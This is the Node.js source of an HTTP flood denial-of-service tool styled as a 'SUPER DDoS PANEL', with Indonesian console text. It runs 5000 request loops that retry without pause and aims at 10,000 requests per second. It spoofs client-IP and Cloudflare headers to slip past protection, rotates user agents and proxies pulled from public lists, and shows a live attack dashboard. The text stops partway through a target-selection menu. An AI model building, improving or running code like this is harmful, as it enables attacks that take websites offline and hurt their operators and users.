const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const readline = require('readline');
const { URL } = require('url');

// =============================================
// SUPER GANAS CONFIGURATION
// =============================================
const BOT_CONFIG = {
    proxyFile: "proxy.txt",
    userAgentFile: "ua.txt",
    
    // Enhanced Attack Settings
    maxThreads: 5000,
    requestsPerSecond: 10000,
    timeout: 3000,
    
    // Enhanced Headers untuk Bypass Protection
    acceptHeaders: [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/plain, */*"
    ],

    encodingHeaders: [
        "gzip, deflate, br",
        "gzip, deflate",
        "identity"
    ],

    languageHeaders: [
        "en-US,en;q=0.9",
        "en-US,en;q=0.8",
        "id,en;q=0.9",
        "id-ID,id;q=0.9,en;q=0.8"
    ],

    referers: [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.twitter.com/",
        "https://www.instagram.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.github.com/"
    ],

    cacheControls: [
        "no-cache",
        "max-age=0",
        "no-store"
    ],

    // Advanced Bypass Techniques
    bypassHeaders: {
        'X-Forwarded-For': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'X-Real-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'X-Client-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'CF-Connecting-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'True-Client-IP': () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },

    // Attack Methods
    methods: ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'],
    
    // Proxy Sources untuk auto-update
    proxySources: [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=10000",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"
    ]
};
// =============================================
// ENHANCED FUNCTIONS
// =============================================
class SuperAttackManager {
constructor() {
this.active = true;
this.stats = {
success: 0,
error: 0,
startTime: Date.now()
};
}
readProxies() {
try {
if (!fs.existsSync(BOT_CONFIG.proxyFile)) {
console.log('\x1b[33m[⚠️] File proxy tidak ditemukan, menggunakan direct connection\x1b[0m');
return [];
}
const data = fs.readFileSync(BOT_CONFIG.proxyFile, "utf8");
const proxies = data.trim().split("\n").map(line => line.trim()).filter(line => line);
console.log(`\x1b[32m[✅] Loaded ${proxies.length} proxies\x1b[0m`);
return proxies;
} catch (error) {
console.error(`\x1b[31m[❌] Gagal membaca proxy: ${error}\x1b[0m`);
return [];
}
}
readUserAgents() {
try {
const data = fs.readFileSync(BOT_CONFIG.userAgentFile, "utf-8")
.replace(/\r/g, "")
.split("\n");
const agents = data.map(line => line.trim()).filter(line => line);
console.log(`\x1b[32m[✅] Loaded ${agents.length} user agents\x1b[0m`);
return agents;
} catch (error) {
console.error(`\x1b[31m[❌] Gagal membaca user agents, menggunakan default\x1b[0m`);
return [
    // Chrome - Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    // Chrome - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    
    // Chrome - Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    
    // Firefox - Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    // Firefox - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    // Firefox - Linux
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
    
    // Safari - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    
    // Edge - Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0',
    
    // Edge - macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    
    // Opera
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    
    // Chrome Mobile - Android
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.153 Mobile Safari/537.36',
    
    // Safari Mobile - iOS
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPod touch; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    
    // Samsung Browser
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36',
    
    // UC Browser
    'Mozilla/5.0 (Linux; U; Android 11; en-US; RMX2185 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36',
    
    // Firefox Mobile - Android
    'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:119.0) Gecko/119.0 Firefox/119.0',
    
    // Firefox Mobile - iOS
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/120.0 Mobile/15E148 Safari/605.1.15',
    
    // Chrome - Windows (older versions)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    
    // Firefox - Windows (older versions)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
    
    // Windows 11 specific
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    
    // Windows 8.1
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    // Windows 7
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    // Chrome OS
    'Mozilla/5.0 (X11; CrOS x86_64 15393.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    // Android Tablets
    'Mozilla/5.0 (Linux; Android 13; SM-X500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Safari/537.36',
    
    // iPad Tablets
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    
    // Desktop Linux - Various Distributions
    'Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    
    // Additional Firefox variants
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
    
    // Additional Safari variants
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
    
    // Additional Edge variants
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
    
    // Additional Mobile variants
    'Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    
    // Legacy browsers
    'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    
    // Additional Opera variants
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/105.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
];
}
}
getRandomElement(arr) {
return arr[Math.floor(Math.random() * arr.length)];
}
sanitizeUserAgent(userAgent) {
return userAgent.replace(/[^\x20-\x7E]/g, "");
}
createAgent(proxy) {
if (!proxy) return null;
try {
const proxyParts = proxy.split(":");
const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
const proxyUrl = `${proxyProtocol}://${proxyParts[1] ? `${proxyParts[0]}:${proxyParts[1]}` : proxyParts[0]}`;
return proxyProtocol === "socks5" 
? new SocksProxyAgent(proxyUrl)
: new HttpsProxyAgent(proxyUrl);
} catch (error) {
return null;
}
}
// Enhanced Request dengan Bypass Techniques
async sendEnhancedRequest(target, agent, userAgents, requestId) {
if (!this.active) return;
try {
const method = this.getRandomElement(BOT_CONFIG.methods);
const sanitizedUserAgent = this.sanitizeUserAgent(this.getRandomElement(userAgents));
// Generate advanced headers dengan bypass techniques
const headers = {
"User-Agent": sanitizedUserAgent,
"Accept": this.getRandomElement(BOT_CONFIG.acceptHeaders),
"Accept-Encoding": this.getRandomElement(BOT_CONFIG.encodingHeaders),
"Accept-Language": this.getRandomElement(BOT_CONFIG.languageHeaders),
"Referer": this.getRandomElement(BOT_CONFIG.referers),
"Cache-Control": this.getRandomElement(BOT_CONFIG.cacheControls),
"DNT": "1",
"Connection": "keep-alive",
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Dest": "document",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Site": "none"
};
// Tambahkan bypass headers
Object.keys(BOT_CONFIG.bypassHeaders).forEach(header => {
headers[header] = BOT_CONFIG.bypassHeaders[header]();
});
const requestConfig = {
httpAgent: agent,
httpsAgent: agent,
headers: headers,
timeout: BOT_CONFIG.timeout,
validateStatus: function (status) {
return status >= 200 && status < 600;
}
};
if (method === 'POST' || method === 'PUT') {
requestConfig.data = `data=${Math.random().toString(36).substring(7)}`;
}
const response = await axios({
method: method,
url: target,
...requestConfig
});
this.stats.success++;      
// Immediate retry untuk maximum aggression
setImmediate(() => this.sendEnhancedRequest(target, agent, userAgents, requestId));
} catch (error) {
this.stats.error++;
// Immediate retry meski error
setImmediate(() => this.sendEnhancedRequest(target, agent, userAgents, requestId));
}
}
// Auto-update proxies dengan tampilan modern
async updateProxies() {
console.log('\x1b[1;36m🔄 MEMULAI UPDATE PROXY...\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
let allProxies = [];
const tempFile = 'proxy_temp.txt';
const promises = BOT_CONFIG.proxySources.map(async (source) => {
try {
const response = await axios.get(source, { 
timeout: 8000,
headers: {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}
});
const proxies = response.data.split('\n')
.map(line => line.trim())
.filter(line => line && this.isValidProxy(line));
console.log(`\x1b[1;32m✅ ${proxies.length} proxy dari \x1b[1;36m${new URL(source).hostname}\x1b[0m`);
return proxies;
} catch (error) {
console.log(`\x1b[1;33m⚠️ Gagal dari ${source}: ${error.message}\x1b[0m`);
return [];
}
});
const results = await Promise.allSettled(promises);
results.forEach(result => {
if (result.status === 'fulfilled') {
allProxies = [...allProxies, ...result.value];
}
});
allProxies = [...new Set(allProxies)];
fs.writeFileSync(tempFile, allProxies.join('\n'));
if (fs.existsSync(BOT_CONFIG.proxyFile)) {
fs.unlinkSync(BOT_CONFIG.proxyFile);
}
fs.renameSync(tempFile, BOT_CONFIG.proxyFile);
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;32m📊 UPDATE SELESAI! \x1b[1;36m${allProxies.length}\x1b[1;32m PROXY TERSEDIA\x1b[0m`);
console.log('');
return allProxies;
}
isValidProxy(proxy) {
const pattern = /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/;
return pattern.test(proxy);
}
startSuperAttack(targetUrl) {
console.log('\x1b[1;35m🚀 MEMULAI SERANGAN SUPER GANAS!\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;36m🎯 Target: \x1b[1;37m${targetUrl}\x1b[0m`);
console.log(`\x1b[1;36m⚡ Threads: \x1b[1;37m${BOT_CONFIG.maxThreads}\x1b[0m`);
console.log('');
const proxies = this.readProxies();
const userAgents = this.readUserAgents();
this.stats = {
success: 0,
error: 0,
startTime: Date.now()
};
// Start stats display
this.showStats();
// Launch attack threads
for (let i = 0; i < BOT_CONFIG.maxThreads; i++) {
setTimeout(() => {
const proxy = proxies.length > 0 ? this.getRandomElement(proxies) : null;
const agent = this.createAgent(proxy);
this.sendEnhancedRequest(targetUrl, agent, userAgents, i);
}, i * 10);
}
console.log('\x1b[1;32m✅ SEMUA THREAD SERANGAN TELAH DILUNCURKAN!\x1b[0m');
console.log('');
}
showStats() {
setInterval(() => {
if (!this.active) return;
const duration = Math.floor((Date.now() - this.stats.startTime) / 1000);
const totalRequests = this.stats.success + this.stats.error;
const rps = duration > 0 ? Math.floor(totalRequests / duration) : 0;
const successRate = totalRequests > 0 ? ((this.stats.success / totalRequests) * 100).toFixed(1) : 0;
process.stdout.write('\x1Bc');
// Header
console.log('\x1b[1;36m╔══════════════════════════════════════════════════════════════╗\x1b[0m');
console.log('\x1b[1;36m║               🚀 RIZKY AI   SUPER DDoS PANEL🚀                 ║\x1b[0m');
console.log('\x1b[1;36m║                  🔥 LIVE ATTACK DASHBOARD🔥                    ║\x1b[0m');
console.log('\x1b[1;36m╚══════════════════════════════════════════════════════════════╝\x1b[0m');
console.log('');
// Server Info
console.log('\x1b[1;35m🎯 TARGET INFORMATION\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;37mURL     : \x1b[1;32m${this.targetUrl || 'N/A'}\x1b[0m`);
console.log(`\x1b[1;37mThreads : \x1b[1;32m${BOT_CONFIG.maxThreads.toLocaleString()}\x1b[0m`);
console.log(`\x1b[1;37mDuration: \x1b[1;32m${this.formatTime(duration)}\x1b[0m`);
console.log('');
// Attack Statistics
console.log('\x1b[1;35m📊 ATTACK STATISTICS\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;37mTotal Requests : \x1b[1;32m${totalRequests.toLocaleString()}\x1b[0m`);
console.log(`\x1b[1;37mRPS            : \x1b[1;31m${rps.toLocaleString()}\x1b[0m`);
console.log(`\x1b[1;37mSuccess        : \x1b[1;32m${this.stats.success.toLocaleString()}\x1b[0m`);
console.log(`\x1b[1;37mErrors         : \x1b[1;31m${this.stats.error.toLocaleString()}\x1b[0m`);
console.log(`\x1b[1;37mSuccess Rate   : \x1b[1;33m${successRate}%\x1b[0m`);
console.log('');
// Real-time Progress Bar dengan animasi
const progress = (duration % 100) / 100;
const width = 50;
const filled = Math.floor(progress * width);
const empty = width - filled;
const bar = '\x1b[1;32m█\x1b[0m'.repeat(filled) + '\x1b[1;90m▒\x1b[0m'.repeat(empty);
console.log('\x1b[1;35m📈 LIVE PROGRESS\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;37m[${bar}] \x1b[1;36m${Math.floor(progress * 100)}%\x1b[0m`);
console.log('');
// System Status dengan emoji animasi
const statusIcons = ['🟢', '🟡', '🔵'];
const currentIcon = statusIcons[Math.floor(duration % 3)];
console.log('\x1b[1;35m🖥️ SYSTEM STATUS\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`\x1b[1;32m${currentIcon} SERANGAN AKTIF    \x1b[1;36m${currentIcon} PROXY ACTIVE    \x1b[1;35m${currentIcon} THREADS RUNNING\x1b[0m`);
console.log('');
// Performance Indicator
let performanceLevel = '';
let performanceColor = '';
if (rps > 5000) {
performanceLevel = 'ULTRA GANAS';
performanceColor = '\x1b[1;31m';
} else if (rps > 2000) {
performanceLevel = 'SUPER CEPAT';
performanceColor = '\x1b[1;35m';
} else if (rps > 1000) {
performanceLevel = 'CEPAT';
performanceColor = '\x1b[1;33m';
} else {
performanceLevel = 'SEDANG';
performanceColor = '\x1b[1;36m';
}
console.log('\x1b[1;35m⚡ PERFORMANCE LEVEL\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log(`${performanceColor}${performanceLevel}\x1b[0m - ${rps.toLocaleString()} Requests/Second`);
console.log('');
// Warning Message
console.log('\x1b[1;31m⚠️ TEKAN CTRL+C UNTUK MENGENTIKAN SERANGAN\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');  
}, 2000);
}
formatTime(seconds) {
const hours = Math.floor(seconds / 3600);
const minutes = Math.floor((seconds % 3600) / 60);
const secs = seconds % 60;
if (hours > 0) {
return `\x1b[1;33m${hours}h ${minutes}m ${secs}s\x1b[0m`;
} else if (minutes > 0) {
return `\x1b[1;33m${minutes}m ${secs}s\x1b[0m`;
} else {
return `\x1b[1;33m${secs}s\x1b[0m`;
}
}
stop() {
this.active = false;
console.log('\n\x1b[1;31m🛑 SERANGAN DIHENTIKAN!\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
}
}
// =============================================
// MAIN EXECUTION - TANPA PASSWORD
// =============================================
const attackManager = new SuperAttackManager();
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
function showMainMenu() {
console.log('\x1Bc');
console.log('\x1b[1;36m╔══════════════════════════════════════════════════════════════╗\x1b[0m');
console.log('\x1b[1;36m║               🚀 RIZKY AI SUPER DDoS PANEL🚀                   ║\x1b[0m');
console.log('\x1b[1;36m║                 🔥 VERSION: ULTRA GANAS🔥                      ║\x1b[0m');
console.log('\x1b[1;36m╚══════════════════════════════════════════════════════════════╝\x1b[0m');
console.log('');
// Info Panel
console.log('\x1b[1;35m📊 PANEL INFORMATION\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('\x1b[1;37m🤖 BOT NAME  : \x1b[1;32mRIZKY-AI ULTRA\x1b[0m');
console.log('\x1b[1;37m🚀 VERSION   : \x1b[1;32m3.0 SUPER GANAS\x1b[0m');
console.log('\x1b[1;37m👑 AUTHOR    : \x1b[1;32mRIZKY CYBER\x1b[0m');
console.log('\x1b[1;37m📅 STATUS    : \x1b[1;32mREADY FOR ATTACK\x1b[0m');
console.log('');
// Features Panel
console.log('\x1b[1;35m💫 SUPER FEATURES\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('\x1b[1;32m✅ 5000+ Concurrent Threads\x1b[0m');
console.log('\x1b[1;32m✅ Auto Proxy Rotation & Update\x1b[0m');
console.log('\x1b[1;32m✅ Advanced Bypass Protection\x1b[0m');
console.log('\x1b[1;32m✅ Real-Time Statistics Dashboard\x1b[0m');
console.log('\x1b[1;32m✅ Multiple Attack Methods\x1b[0m');
console.log('\x1b[1;32m✅ Ultra Fast Request Rate (10k+ RPS)\x1b[0m');
console.log('');
// Warning Panel
console.log('\x1b[1;31m⚠️ PERINGATAN PENTING\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('\x1b[1;31m🚫 JANGAN SERANG WEBSITE PEMERINTAH\x1b[0m');
console.log('\x1b[1;31m🚫 JANGAN SERANG WEBSITE PENDIDIKAN\x1b[0m');
console.log('\x1b[1;31m🚫 GUNAKAN DENGAN BIJAK DAN TANGGUNG JAWAB\x1b[0m');
console.log('');
showTargetSelectionMenu();
}
function showTargetSelectionMenu() {
console.log('\x1b[1;32m🎯 PILIH JENIS TARGET\x1b[0m');
console.log('\x1b[1;33m──────────────────────────────────────────\x1b[0m');
console.log('');
